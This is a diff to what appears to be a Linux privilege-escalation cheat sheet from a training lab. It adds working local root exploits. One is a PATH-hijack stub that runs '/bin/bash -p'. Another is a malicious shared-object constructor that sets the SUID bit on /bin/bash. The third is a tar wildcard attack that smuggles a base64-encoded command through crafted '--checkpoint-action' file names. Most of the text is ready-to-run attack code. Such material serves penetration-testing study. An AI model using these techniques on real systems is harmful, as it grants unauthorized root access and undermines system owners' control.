@@ -134,7 +134,7 @@ One line (`apache2`) suggests that the service executable is being called to sta
 Create a malicious file in a writable path and call it like the file the SUID executable calls.
 
 ```shell
-echo '/bin/bash -i' > /tmp/apache2
+echo '/bin/bash -p' > /tmp/apache2
 ```
 
 Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid executable to gain a root shell:
@@ -143,39 +143,43 @@ Prepend the current directory (or where the new service executable is located) t
 export PATH=/tmp:$PATH
 ```
 
+```shell
+apache2
+```
+
 ### Shared Object Injection
 
 A SUID executable can be vulnerable to shared object injection.
-First, execute the file and note that currently it displays a progress bar before exiting.
 
-Run **strace** on the file and search the output for open/access calls and for "no such file" errors:
+First, execute the file and notice the missing object error.
+
+If there is no feedback, run **strace** on the file and search the output for open/access calls and for "no such file" errors:
 
 ```shell
-strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+strace suid-so 2>&1 | grep -iE "open|access|no such file"
 ```
 
-Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within the home directory, but it cannot be found.
-Create the **.config** directory for the libcalc.so file: `mkdir /home/user/.config`
+Note that the executable tries to load the `.config/libcalc.so` shared object within the home directory, but it cannot be found.
+Create the **.config** directory for the `libcalc.so` file: `mkdir .config`
 
-Compile a malicious code into a shared object at the location the **suid-so** executable was looking for it:
+After knowing the path, compile a malicious code into a shared object at the location the **suid-so** executable is looking for:
 
 ```c
-#include <stdio.h>
 #include <stdlib.h>
-int main() { 
-    system("/bin/bash"); 
-    return 0; 
+
+__attribute__((constructor)) void make_setuid() {
+    system("chmod +s /bin/bash");
 }
 ```
 
 ```shell
-gcc -shared -fPIC /home/user/tools/suid/libcalc.c -o /home/user/.config/libcalc.so 
+gcc -shared -fPIC libcalc.c -o libcalc.so 
 ```
 
-Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.
+Execute `/bin/bash -p` to gain a root shell.
 
 ```shell
-/usr/local/bin/suid-so
+/bin/bash -p
 ```
 
 ## Weak file permissions
@@ -225,4 +229,16 @@ chmod +xs share/shell.elf
 
 # on the victim, as the low privileged user, execute the file to gain a root shell:
 /<share_path>/shell.elf
+```
+
+## Tar Wildcard
+
+A script that calls a **tar** with `*` can be abused to execute arbitrary commands by creating checkpoint files in the target directory.
+
+```shell
+echo -n 'chmod +s /bin/bash' | base64
+> Y2htb2QgK3MgL2Jpbi9iYXNo
+
+touch -- "--checkpoint=1"
+touch -- '--checkpoint-action=exec="echo Y2htb2QgK3MgL2Jpbi9iYXNo | base64 -d | bash"'
 ```
